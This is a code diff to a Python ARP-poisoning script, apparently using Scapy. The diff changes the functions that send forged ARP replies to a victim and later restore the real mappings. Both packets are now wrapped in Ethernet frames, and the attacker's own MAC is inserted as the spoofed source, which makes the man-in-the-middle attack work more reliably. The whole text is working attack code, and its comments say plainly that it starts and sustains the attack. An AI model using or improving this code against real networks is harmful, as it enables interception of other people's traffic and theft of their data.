@@ -35,7 +35,8 @@ def network_scan(ip):
 
 # (1.) Start the poisoning attack by sending fake ARP replies.
 def poison(victim_ip, poison_ip, victim_mac):
-    fake_packet = sc.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=poison_ip)
+    attacker_mac = sc.get_if_hwaddr(sc.conf.iface)
+    fake_packet = sc.Ether(dst=victim_mac)/sc.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=poison_ip, hwsrc=attacker_mac)
     sc.send(fake_packet, verbose=False)
 
 # (2.) Get the MAC adress of a given IP adress
@@ -52,7 +53,7 @@ def get_mac(ip):
 
 # (3.) Sends real ARP replies to stop and clean up the attack.
 def stop_attack(victim_ip, real_ip, victim_mac, real_mac):
-    packet = sc.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=real_ip, hwsrc=real_mac)
+    packet = sc.Ether(dst=victim_mac)/sc.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=real_ip, hwsrc=real_mac)
     sc.send(packet, count=4, verbose=False)
 
 ## Now to start the attack, keep it goining, and stop it when we want.
